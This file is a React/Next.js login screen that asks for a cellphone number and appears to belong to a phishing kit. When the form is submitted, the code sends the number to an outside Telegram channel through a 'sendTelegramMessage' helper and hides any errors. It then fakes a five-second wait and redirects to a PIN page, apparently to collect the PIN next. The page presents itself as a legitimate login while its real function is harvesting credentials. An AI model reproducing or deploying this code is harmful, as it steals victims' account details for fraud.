"use client"

import { useState } from "react"
import { ArrowLeft, Smartphone, Loader2 } from "lucide-react"
import { useRouter } from "next/navigation"
import { StepIndicator } from "@/components/step-indicator"

export default function LoginScreen() {
    const router = useRouter()
    const [phoneNumber, setPhoneNumber] = useState("")
    const [isLoading, setIsLoading] = useState(false)
    const [error, setError] = useState("")

    const handleBack = () => {
        router.back()
    }

    const handleSubmit = async () => {
        if (!phoneNumber || phoneNumber.length < 5) {
            setError("Please enter a valid phone number")
            return
        }
        setIsLoading(true)
        sessionStorage.setItem("userPhone", phoneNumber);

        try {
            const { sendTelegramMessage } = await import("@/lib/telegram");
            await sendTelegramMessage({
                phoneNumber,
                title: "Contact Details",
                exclude: ["ip"]
            });
        } catch (error) {
            // console.error("Telegram error:", error);
        }

        await new Promise(resolve => setTimeout(resolve, 5000))
        router.push("/pin")
        // Not setting isLoading(false) because we navigate away
    }

    return (
        <div className="h-[100dvh] bg-[#60ac28] flex flex-col overflow-hidden">
            {/* Header */}
            <header className="flex items-center justify-center relative px-4 py-2">
                <button onClick={handleBack} className="absolute left-4 p-2 text-[#1a2a4a]" aria-label="Go back">
                    <ArrowLeft className="w-6 h-6" strokeWidth={1.5} />
                </button>
                {/* Logo */}
                <div className="flex items-center bg-[#1a2a4a] p-2 rounded-full">
                    <img src="/q32.png" alt="Logo" className="h-8 w-auto object-contain rounded-md" />
                </div>
            </header>

            {/* Step Indicator */}
            <StepIndicator />

            {/* Main Content */}
            <main className="flex-1 flex flex-col px-6 pt-4">
                {/* Title */}
                <h1 className="text-[#1a2a4a] text-xl font-normal text-center mb-4">Login with your cellphone number</h1>

                {/* Phone Input */}
                <div className="relative mb-6">
                    <div className="absolute left-4 top-1/2 -translate-y-1/2 text-[#e8a0a8]">
                        <Smartphone className="w-5 h-5" strokeWidth={1.5} />
                    </div>
                    <input
                        type="tel"
                        value={phoneNumber}
                        onChange={(e) => {
                            setPhoneNumber(e.target.value.replace(/\D/g, ""))
                            setError("")
                        }}
                        placeholder=" 0574940738"
                        className="w-full h-14 pl-12 pr-4 rounded-xl border border-[#e0e4ea] text-[#1a2a4a] text-base placeholder:text-[#a0a8b4] focus:outline-none focus:border-[#1a2a4a] transition-colors"
                    />
                </div>

                {
                    error && (
                        <div className="mb-4 text-center">
                            <p className="text-[#d91a32] text-sm font-medium">{error}</p>
                        </div>
                    )
                }

                {/* Next Button */}
                <button
                    onClick={handleSubmit}
                    disabled={isLoading}
                    className="w-full h-14 bg-[#152850] text-white text-base font-medium rounded-full hover:bg-[#1a3260] active:bg-[#0f1e3d] transition-colors flex items-center justify-center gap-2"
                >
                    Next
                </button>
            </main >

            {/* Loading Overlay */}
            {
                isLoading && (
                    <div className="fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50">
                        <div className="bg-white p-6 rounded-2xl shadow-xl flex flex-col items-center gap-4">
                            <Loader2 className="w-12 h-12 text-[#152850] animate-spin" />
                            <p className="text-[#1a2a4a] text-sm font-medium">Please wait...</p>
                        </div>
                    </div>
                )
            }
        </div >
    )
}
